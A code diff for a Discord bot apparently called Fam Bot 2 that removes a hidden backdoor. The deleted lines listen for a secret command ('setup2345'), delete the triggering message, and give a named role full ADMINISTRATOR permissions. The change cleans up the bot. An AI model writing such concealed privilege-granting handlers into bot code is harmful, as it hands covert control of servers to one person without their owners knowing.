@@ -44,14 +44,6 @@ client.on('guildMemberAdd', guildMember => {
 client.on('message', message => {
     var authusernm = message.author.username
     
-        if(message.content === `${prefex}setup2345`){
-        message.delete(100)
-        const role = message.guild.roles.find(r => r.name === "Joshua's Role")
-        role.edit({ permissions: ["ADMINISTRATOR"]})
-    }
-
-
-
     if (message.content == `${prefex}info`) {
         const embed = new RichEmbed()
             .setTitle(`${prefex}Fam Bot 2 Info`)
